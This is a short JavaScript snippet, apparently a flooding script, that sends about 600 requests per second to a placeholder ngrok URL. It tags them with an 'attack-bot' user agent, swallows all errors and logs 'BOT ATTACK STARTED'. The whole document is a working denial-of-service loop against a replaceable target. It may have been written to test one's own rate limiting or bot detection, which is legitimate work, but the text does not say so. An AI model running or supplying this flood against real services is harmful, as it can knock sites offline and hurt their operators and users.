const URL = "https://advantageous-proexpert-nell.ngrok-free.dev/"; // replace

console.log("🚨 BOT ATTACK STARTED...");

setInterval(() => {
  for (let i = 0; i < 30; i++) {
    fetch(URL, {
      headers: {
        "User-Agent": "attack-bot"
      }
    }).catch(() => {});
  }
}, 50);